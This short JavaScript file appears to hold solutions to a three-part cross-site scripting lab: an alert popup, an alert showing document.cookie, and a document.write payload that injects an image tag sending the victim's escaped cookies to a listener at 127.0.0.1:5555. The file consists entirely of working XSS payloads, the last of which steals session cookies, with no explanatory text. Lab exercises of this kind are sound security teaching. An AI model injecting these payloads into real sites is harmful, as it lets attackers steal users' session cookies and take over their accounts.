//Task1
alert("XSS Attack!");

//Task2
alert(document.cookie);

//Task3
document.write('<img src=http://127.0.0.1:5555?c='+ escape(document.cookie) + '   >');
